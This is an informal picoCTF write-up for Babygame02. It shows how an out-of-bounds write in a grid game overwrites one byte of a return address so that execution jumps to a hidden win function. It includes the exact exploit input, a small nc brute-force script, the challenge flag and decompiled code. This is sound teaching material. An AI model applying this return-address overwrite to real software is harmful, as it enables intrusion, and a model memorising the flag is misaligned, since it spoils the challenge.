PicoCTF Babygame02 Writeup: Like Babygame01, we are placed in a 30 x 90 grid
with a flag('X') placed on the bottom right corner. Upon reaching it, the
game exits, but we do not get the flag.

![Start of the game](images/babygameEnter.png)

wtf why no worky its ghidra time

also previous keybindings work like 'p' and 'l' lmao

ok code looks wonky, lets see what happens now. Hmmmmmmm, theres a win function
that, but its not called?

Local a9d is probably map, 
like before player height is probs aa8, and width is a9d based on the while
conditionals, but this time there is no win Flag? how do we wiiiiiin?
First I clean up stuff.

![image of player struct, move stuff around though, like the code which is out
of order](images/playerStructGhidra.png)

wtf retyping map from undefined[2700] to char[2700] removed the ecx stack
alignment procedure variables local_10 and also local_11? Whyyyyyy. Also am I
supposed to include this in writeup or just ask question hmmmmmmmm 

ok anyway code is cleaned up and looks so pretty :)

Like before, the only thing we control is the input to move_player so lets see
what abilities this gives us.

It looks like the same thing, we are able to set our player's position to
anything and so overwrite memory outside of the map. We can also change
player_tile using 'l'. omg arbitrarily change memory!??! well no :( can only
specify one byte to be a specific value before it gets changed to 0x2e (.) so it
will look like ...l where l is the player set value. 

We need to call the win function, and we have the ability to overwrite an
arbitrary amount of bytes with the value 0x2e, and one byte with a chosen value.
What can we do? Could try jumping to win function, address of 0x0804975d, but
thats 4 bytes to overwrite. However, move_player is called at 0x08049704, its
return value is the address of the next instruction, 0x08049709. This is only
one byte off from the address of win, so we only need to overwrite a single byte
to win!

![Where move_player gets called from main, along with where it returns
to](images/movePlayerCall.png)

To find the position of the location of move_player's return address relative to
the map, we can use gdb. I've set a breakpoint at the very start of
move_player (before ebp is pushed) in order to examine its return value and arguments.

![finding addresses with gdb](images/gdbFindAddress.png)

At this state, esp contains the return address, esp + 0x4 contains the address
of the player struct (move_player's first argument), esp + 0x8 points to our input (0x77='w'),
and esp + 0xc is address of the beginning of the map struct. We want to change
the least significant byte of our return address from 0x09 to 0x5d, so we want
to write to 0xffffc24c (this is little endian, so the LSB is stored at the
base). Our map starts at 0xffffc273 (based on the third argument) so we want to
access map[0xffffc24c - 0xffffc273] = map[-39]. Of course, we want to be careful
not to write to other values on the stack that might cause the game to break.
One way we could do that is by setting our index to have the game access map[51]
and moving up so that the game will access map[51-90]=map[-39]. I will do this: 
set the player to 0x5d = ']' and move to (0, 0), than perform the following
sequence of moves:
```
's' map[90]
'a' * 39 map[90 - 39] = map[51]
'w' map[51 - 90] = map[-39]
```
Final command looks like this: `echo
aaaawwwwl]saaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw | ./game`

On local machine:

![win function triggered](images/localMachine.png)

Unfortunately I get trolled on challenge instance and breaks before giving a
flag:(
This is probably because return address is different so its probably a good idea 
to brute force the last byte. I write a little script to make brute forcing
easier.

```bash
#! /bin/sh

pwn () {
	echo "aaaawwwwl$1saaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw" | nc saturn.picoctf.net 49232 > out; tail out
}
```

After like 5 attempts,

![Flag is given](images/pwn.png)


We get the flag picoCTF{gamer_jump1ng_4r0unD_0c5d2789}

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  int iVar1;
  int local_aa8;
  int local_aa4;
  undefined local_a9d [2700];
  char local_11;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  init_player(&local_aa8);
  init_map(local_a9d,&local_aa8);
  print_map(local_a9d,&local_aa8);
  signal(2,sigint_handler);
  do {
    do {
      iVar1 = getchar();
      local_11 = (char)iVar1;
      move_player(&local_aa8,(int)local_11,local_a9d);
      print_map(local_a9d,&local_aa8);
    } while (local_aa8 != 0x1d);
  } while (local_aa4 != 0x59);
  puts("You win!");
  return 0;
}
```

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  int iVar1;
  playerStruct player;
  char map [2700];
  
  init_player(&player);
  init_map(map,&player);
  print_map(map,&player);
  signal(2,sigint_handler);
  do {
    do {
      iVar1 = getchar();
      move_player(&player,(int)(char)iVar1,map);
      print_map(map,&player);
    } while (player.height != 0x1d);
  } while (player.width != 0x59);
  puts("You win!");
  return 0;
}
```

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void move_player(playerStruct *player,char input,int map)

{
  int iVar1;
  
  if (input == 'l') {
    iVar1 = getchar();
    player_tile = (undefined)iVar1;
  }
  if (input == 'p') {
    solve_round(map,player);
  }
  *(undefined *)(player->height * 0x5a + map + player->width) = 0x2e;
  if (input == 'w') {
    player->height = player->height + -1;
  }
  else if (input == 's') {
    player->height = player->height + 1;
  }
  else if (input == 'a') {
    player->width = player->width + -1;
  }
  else if (input == 'd') {
    player->width = player->width + 1;
  }
  *(undefined *)(player->height * 0x5a + map + player->width) = player_tile;
  return;
}
```
